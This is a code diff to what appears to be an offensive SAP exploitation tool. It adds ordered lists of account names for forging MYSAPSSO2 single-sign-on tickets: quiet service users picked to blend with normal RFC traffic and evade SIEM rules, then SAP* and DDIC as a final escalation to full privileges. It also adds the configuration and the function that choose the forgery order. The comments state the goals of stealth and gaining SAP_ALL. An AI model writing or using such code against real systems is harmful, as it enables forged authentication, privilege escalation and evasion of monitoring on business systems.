@@ -29,6 +29,27 @@ DEFAULT_DIAG_TERMINAL = "sapscanner"
 # can override via EvasionConfig.diag_terminal_name.
 DEFAULT_SPOOF_TERMINAL = "WS-NB-04"
 
+# T2.4 — MYSAPSSO2 forge identities.
+#
+# BLENDER_USERS are service / system identities that appear in normal
+# RFC and background traffic on every standard SAP install — TMS,
+# SolMan, BW, generic RFC service.  A forged ticket as one of these
+# blends with day-to-day chatter; nothing in the SAL trail looks like
+# the textbook "SAP\* logon from unusual workstation" IoC.
+#
+# ESCALATION_USERS (SAP\*, DDIC) are the universal super-user and
+# data-dictionary owner — every SAP SIEM rule flags these.  Reserved
+# for the *end* of the fanout list, after every quieter alternative.
+MYSAPSSO2_BLENDER_USERS = (
+    "CPIC_USER",     # background RFC service user — present on almost every system
+    "SAPCPIC",       # legacy CPIC variant — still common on older installs
+    "TMSADM",        # Transport Management System admin — background only
+    "RFCUSER",       # generic RFC service user — common naming convention
+    "SOLMAN_BTC",    # Solution Manager batch user
+    "BWREMOTE_USER", # BW background user
+)
+MYSAPSSO2_ESCALATION_USERS = ("SAP*", "DDIC")
+
 
 @dataclass
 class EvasionConfig:
@@ -48,6 +69,12 @@ class EvasionConfig:
     # and primitives are available on the target.
     os_exec_channel: str = ""
 
+    # Override for MYSAPSSO2 fanout identity list.  Empty → blender-
+    # first ordering from ``effective_mysapsso2_users``.  Comma-
+    # separated string (e.g. "CPIC_USER,TMSADM").  Operator-supplied
+    # identities are used verbatim in the order given.
+    mysapsso2_users: str = ""
+
     # Recorded so the GUI can show "last edited at".
     updated_at: str = ""
 
@@ -59,6 +86,7 @@ class EvasionConfig:
         return {
             "diag_terminal_name": self.diag_terminal_name,
             "os_exec_channel": self.os_exec_channel,
+            "mysapsso2_users": self.mysapsso2_users,
             "updated_at": self.updated_at,
         }
 
@@ -67,8 +95,37 @@ class EvasionConfig:
         return cls(
             diag_terminal_name=d.get("diag_terminal_name", ""),
             os_exec_channel=d.get("os_exec_channel", ""),
+            mysapsso2_users=d.get("mysapsso2_users", ""),
             updated_at=d.get("updated_at", ""),
         )
+
+
+def effective_mysapsso2_users(evasion: EvasionConfig | None
+                                ) -> tuple[tuple, str]:
+    """T2.4 — return the MYSAPSSO2 fanout identity list and a label.
+
+    Returns ``(users, mode)`` where ``users`` is a tuple of ABAP
+    usernames to forge tickets for in order, and ``mode`` is one of:
+      - ``"operator"``   — operator explicitly set
+        ``EvasionConfig.mysapsso2_users``; that list is used verbatim
+        (no escalation appended).
+      - ``"blender_first"`` — default; service-user blender pool
+        first, ``SAP*`` and ``DDIC`` at the end as escalation steps.
+
+    Rationale: every SAP SIEM rule looks for ``SAP*`` and ``DDIC``
+    logons.  CPIC_USER / SAPCPIC / TMSADM / SOLMAN_BTC tickets blend
+    with normal background-RFC traffic so an autopwn fanout that's
+    already picked up the system can do its work quietly first and
+    only escalate to the textbook IoC identities when the quieter
+    ones haven't already won us SAP_ALL.
+    """
+    override = (evasion.mysapsso2_users if evasion else "") or ""
+    if override.strip():
+        parts = [p.strip() for p in override.split(",") if p.strip()]
+        if parts:
+            return tuple(parts), "operator"
+    return (MYSAPSSO2_BLENDER_USERS + MYSAPSSO2_ESCALATION_USERS,
+            "blender_first")
 
 
 def effective_os_exec_channel(node, creds, evasion: EvasionConfig | None
